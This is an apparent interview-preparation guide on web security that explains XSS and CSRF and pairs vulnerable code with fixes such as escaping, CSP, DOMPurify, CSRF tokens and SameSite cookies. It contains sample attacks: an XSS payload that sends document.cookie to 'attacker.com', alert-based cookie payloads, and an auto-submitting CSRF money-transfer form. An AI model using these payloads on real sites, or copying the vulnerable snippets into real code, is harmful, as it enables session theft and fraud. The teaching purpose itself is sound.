# Common Web Security Vulnerabilities

> **Master web security - XSS, CSRF, SQL injection, authentication, and security best practices**

---

## Question 1: What is XSS (Cross-Site Scripting) and how do you prevent it?

**Difficulty:** 🔴 Hard
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 12-15 minutes
**Companies:** Google, Meta, Amazon, Microsoft, Netflix

### Question
Explain XSS (Cross-Site Scripting). What are the different types? How do you prevent XSS attacks in modern web applications?

### Answer

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

1. **Types of XSS**
   - **Stored XSS** - Malicious script stored in database (most dangerous)
   - **Reflected XSS** - Script reflected from URL/form input
   - **DOM-based XSS** - Manipulation of DOM in browser

2. **Impact**
   - Steal cookies/session tokens
   - Capture keystrokes
   - Redirect users
   - Deface website
   - Spread malware

3. **Prevention**
   - Sanitize all user input
   - Escape output
   - Use Content Security Policy (CSP)
   - HTTPOnly cookies
   - Framework-level protection (React, Angular auto-escape)

4. **Defense in Depth**
   - Input validation
   - Output encoding
   - CSP headers
   - Secure cookies

### Code Example

```javascript
// STORED XSS ATTACK

// ❌ Vulnerable: Directly inserting user input
app.post('/comment', (req, res) => {
  const comment = req.body.comment;

  // Stored in database
  db.comments.insert({ text: comment });

  // Later displayed on page
  res.send(`<div>${comment}</div>`);
});

// Attack payload:
// <script>
//   fetch('https://attacker.com/steal?cookie=' + document.cookie)
// </script>

// ✅ Safe: Escape HTML
const escapeHTML = (str) => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
};

app.post('/comment', (req, res) => {
  const comment = escapeHTML(req.body.comment);
  db.comments.insert({ text: comment });
  res.send(`<div>${comment}</div>`);
});

// REFLECTED XSS ATTACK

// ❌ Vulnerable: Reflecting user input
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Attack URL:
// /search?q=<script>alert(document.cookie)</script>

// ✅ Safe: Escape before rendering
app.get('/search', (req, res) => {
  const query = escapeHTML(req.query.q);
  res.send(`<h1>Results for: ${query}</h1>`);
});

// DOM-BASED XSS ATTACK

// ❌ Vulnerable: Using innerHTML with user input
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');

document.getElementById('welcome').innerHTML = `Hello ${name}!`;

// Attack URL:
// /?name=<img src=x onerror=alert(document.cookie)>

// ✅ Safe: Use textContent
document.getElementById('welcome').textContent = `Hello ${name}!`;

// Or sanitize with DOMPurify
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(name);
document.getElementById('welcome').innerHTML = `Hello ${clean}!`;

// REACT AUTO-ESCAPING

// ✅ React escapes by default
function Comment({ text }) {
  // Safe: React escapes HTML
  return <div>{text}</div>;
}

// ❌ Dangerous: Bypassing React's protection
function UnsafeComment({ html }) {
  // Vulnerable to XSS
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Safe with sanitization
import DOMPurify from 'dompurify';

function SafeComment({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// CONTENT SECURITY POLICY (CSP)

// HTTP Header
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; style-src 'self' 'unsafe-inline'; img-src *; connect-src 'self' https://api.example.com;

// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none';"
  );
  next();
});

// Blocks inline scripts
<script>alert('XSS')</script>  // Blocked by CSP

// HTTPONLY COOKIES

// ❌ Vulnerable: Cookie accessible to JavaScript
res.cookie('sessionId', token, {
  maxAge: 86400000
});

// JavaScript can steal cookie:
// document.cookie

// ✅ Safe: HTTPOnly cookie
res.cookie('sessionId', token, {
  httpOnly: true,  // Not accessible to JavaScript
  secure: true,    // Only sent over HTTPS
  sameSite: 'strict'  // CSRF protection
});

// INPUT VALIDATION

// ❌ Weak: Only client-side validation
<input type="text" pattern="[A-Za-z]+" required />

// ✅ Strong: Server-side validation
app.post('/api/user', (req, res) => {
  const username = req.body.username;

  // Whitelist approach
  if (!/^[A-Za-z0-9_]{3,20}$/.test(username)) {
    return res.status(400).json({ error: 'Invalid username' });
  }

  // Sanitize
  const clean = escapeHTML(username);

  db.users.insert({ username: clean });
});

// URL PARAMETERS SANITIZATION

// ❌ Vulnerable
const userId = req.params.id;
const query = `SELECT * FROM users WHERE id = ${userId}`;

// ✅ Safe: Parameterized queries
const userId = req.params.id;
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);

// TEMPLATE ENGINES

// ❌ Vulnerable (EJS with raw output)
<div><%- userInput %></div>

// ✅ Safe (EJS with escaping)
<div><%= userInput %></div>

// Pug (Jade) - Escapes by default
div= userInput  // Escaped
div!= userInput  // Unescaped (dangerous)

// PREVENTING XSS IN RICH TEXT EDITORS

// Use a sanitization library
import DOMPurify from 'dompurify';

function RichTextDisplay({ html }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title']
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// X-XSS-PROTECTION HEADER

// Browser's built-in XSS filter (legacy)
res.setHeader('X-XSS-Protection', '1; mode=block');

// Modern approach: Use CSP instead

// REAL-WORLD: Next.js with CSP

// next.config.js
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
`;

const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: ContentSecurityPolicy.replace(/\s{2,}/g, ' ').trim()
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin'
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

### XSS Prevention Checklist

- [ ] Escape all user input before displaying
- [ ] Use framework auto-escaping (React, Vue, Angular)
- [ ] Implement Content Security Policy (CSP)
- [ ] Set HTTPOnly flag on cookies
- [ ] Validate input on server-side
- [ ] Sanitize rich text with DOMPurify
- [ ] Avoid innerHTML, use textContent
- [ ] Use secure coding practices in templates
- [ ] Regular security audits
- [ ] Keep dependencies updated

### Common Mistakes

❌ **Mistake:** Trusting client-side validation
```javascript
// Client validates, but server doesn't
<input type="text" pattern="[A-Za-z]+" />
```

✅ **Correct:** Always validate on server
```javascript
app.post('/api/submit', (req, res) => {
  if (!/^[A-Za-z]+$/.test(req.body.input)) {
    return res.status(400).send('Invalid input');
  }
});
```

❌ **Mistake:** Using eval() or Function()
```javascript
const userCode = req.body.code;
eval(userCode);  // Extremely dangerous!
```

✅ **Correct:** Never execute user-provided code
```javascript
// Don't do this. If you absolutely need dynamic code:
// Use sandboxed environments (Web Workers, iframes with sandbox)
```

### Follow-up Questions

- "How does Content Security Policy work?"
- "What's the difference between stored and reflected XSS?"
- "How do modern frameworks protect against XSS?"
- "What are the limitations of CSP?"

### Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [DOMPurify](https://github.com/cure53/DOMPurify)

---

## Question 2: What is CSRF and how do you prevent it?

**Difficulty:** 🔴 Hard
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 10-12 minutes
**Companies:** Google, Meta, Amazon, Microsoft

### Question
Explain CSRF (Cross-Site Request Forgery). How does it work and what are the prevention techniques?

### Answer

CSRF tricks users into performing unwanted actions on sites where they're authenticated.

1. **How CSRF Works**
   - User logs into trusted site (e.g., bank.com)
   - Browser stores session cookie
   - User visits malicious site
   - Malicious site sends request to bank.com
   - Browser automatically includes session cookie
   - Bank processes request as legitimate

2. **Attack Examples**
   - Transfer money
   - Change email/password
   - Delete account
   - Post content
   - Change settings

3. **Prevention**
   - CSRF tokens (synchronizer tokens)
   - SameSite cookies
   - Check Referer/Origin headers
   - Double submit cookies
   - Custom request headers

4. **Modern Approach**
   - SameSite=Strict/Lax
   - CSRF tokens for state-changing operations
   - Verify origin

### Code Example

```javascript
// CSRF ATTACK EXAMPLE

// User logged into bank.com with session cookie
// Malicious site hosts this form:

<!DOCTYPE html>
<html>
<body>
  <h1>You've won a prize! Click here:</h1>
  <form action="https://bank.com/transfer" method="POST" id="attack">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.getElementById('attack').submit();
  </script>
</body>
</html>

// Bank processes request because session cookie is automatically sent

// PREVENTION 1: CSRF TOKENS

// Express with csurf middleware
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/api/transfer', csrfProtection, (req, res) => {
  // Token automatically verified by middleware
  processTransfer(req.body);
});

// HTML form
<form method="POST" action="/api/transfer">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input type="text" name="to" required>
  <input type="number" name="amount" required>
  <button type="submit">Transfer</button>
</form>

// React SPA with CSRF token
function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    // Fetch CSRF token on mount
    fetch('/api/csrf-token')
      .then(r => r.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      body: JSON.stringify({ to, amount })
    });
  };

  return <form onSubmit={handleSubmit}>...</form>;
}

// Server validates token
app.post('/api/transfer', (req, res) => {
  const token = req.headers['x-csrf-token'];
  const sessionToken = req.session.csrfToken;

  if (!token || token !== sessionToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  processTransfer(req.body);
});

// PREVENTION 2: SAMESITE COOKIES

// ❌ Vulnerable: No SameSite attribute
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true
});

// ✅ Safe: SameSite=Strict
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // Cookie not sent on cross-site requests
});

// SameSite options:
// - Strict: Never sent on cross-site requests
// - Lax: Sent on top-level navigation (GET requests)
// - None: Sent on all requests (requires Secure flag)

res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax'  // Balance security and usability
});

// PREVENTION 3: CHECK ORIGIN/REFERER

app.post('/api/transfer', (req, res) => {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://bank.com', 'https://www.bank.com'];

  if (!origin || !allowedOrigins.includes(new URL(origin).origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }

  processTransfer(req.body);
});

// PREVENTION 4: DOUBLE SUBMIT COOKIE

// Set random token in cookie and require it in request
app.get('/form', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');

  res.cookie('csrf-token', token, {
    httpOnly: false,  // Accessible to JavaScript
    secure: true,
    sameSite: 'strict'
  });

  res.render('form', { csrfToken: token });
});

// Client sends token in both cookie and header/body
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.cookie.match(/csrf-token=([^;]+)/)[1]
  },
  body: JSON.stringify({ to, amount })
});

// Server verifies both match
app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }

  processTransfer(req.body);
});

// PREVENTION 5: CUSTOM REQUEST HEADERS

// For AJAX requests, custom headers prove request is from JavaScript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'  // Custom header
  },
  body: JSON.stringify({ to, amount })
});

// Server checks for custom header
app.post('/api/transfer', (req, res) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Invalid request' });
  }

  processTransfer(req.body);
});

// REAL-WORLD: Next.js with CSRF Protection

// middleware.js
import { NextResponse } from 'next/server';
import { v4 as uuidv4 } from 'uuid';

export function middleware(request) {
  const response = NextResponse.next();

  // Set CSRF token cookie if not exists
  if (!request.cookies.get('csrf-token')) {
    const token = uuidv4();
    response.cookies.set('csrf-token', token, {
      httpOnly: false,
      secure: true,
      sameSite: 'strict'
    });
  }

  // Verify CSRF token on state-changing requests
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(request.method)) {
    const cookieToken = request.cookies.get('csrf-token');
    const headerToken = request.headers.get('x-csrf-token');

    if (!cookieToken || cookieToken !== headerToken) {
      return NextResponse.json(
        { error: 'Invalid CSRF token' },
        { status: 403 }
      );
    }
  }

  return response;
}

export const config = {
  matcher: '/api/:path*',
};

// React hook for CSRF token
function useCSRFToken() {
  const [token, setToken] = useState('');

  useEffect(() => {
    // Get token from cookie
    const match = document.cookie.match(/csrf-token=([^;]+)/);
    if (match) {
      setToken(match[1]);
    }
  }, []);

  return token;
}

// Usage in component
function Form() {
  const csrfToken = useCSRFToken();

  const handleSubmit = async (data) => {
    await fetch('/api/endpoint', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      body: JSON.stringify(data)
    });
  };

  return <form onSubmit={handleSubmit}>...</form>;
}
```

### CSRF Protection Methods Comparison

| Method | Pros | Cons |
|--------|------|------|
| **CSRF Tokens** | Strong protection, widely supported | Requires server state, complex SPA setup |
| **SameSite Cookies** | Simple, no server changes | Not supported in old browsers, can break workflows |
| **Double Submit** | Stateless | Vulnerable to subdomain attacks |
| **Origin Check** | Simple | Can be bypassed, breaks proxies |
| **Custom Headers** | Works for AJAX | Doesn't protect forms |

### Common Mistakes

❌ **Mistake:** Only using GET for state changes
```javascript
// GET requests should be idempotent
<a href="/api/delete-account">Delete Account</a>
```

✅ **Correct:** Use POST/DELETE for state changes
```javascript
<form method="POST" action="/api/delete-account">
  <input type="hidden" name="_csrf" value="token">
  <button>Delete Account</button>
</form>
```

❌ **Mistake:** Not validating CSRF token
```javascript
// Token sent but not validated
app.post('/api/transfer', (req, res) => {
  // Missing: token validation
  processTransfer(req.body);
});
```

✅ **Correct:** Always validate token
```javascript
app.post('/api/transfer', csrfProtection, (req, res) => {
  // Middleware validates token
  processTransfer(req.body);
});
```

### Follow-up Questions

- "How do SameSite cookies prevent CSRF?"
- "What's the difference between Strict and Lax?"
- "How do you implement CSRF protection in SPA?"
- "Can CSRF tokens be stored in localStorage?"

### Resources

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [SameSite Cookies](https://web.dev/samesite-cookies-explained/)
- [CSRF Tokens Explained](https://portswigger.net/web-security/csrf/tokens)

---

[← Back to Security README](./README.md)

**Progress:** 2 of 5 security questions
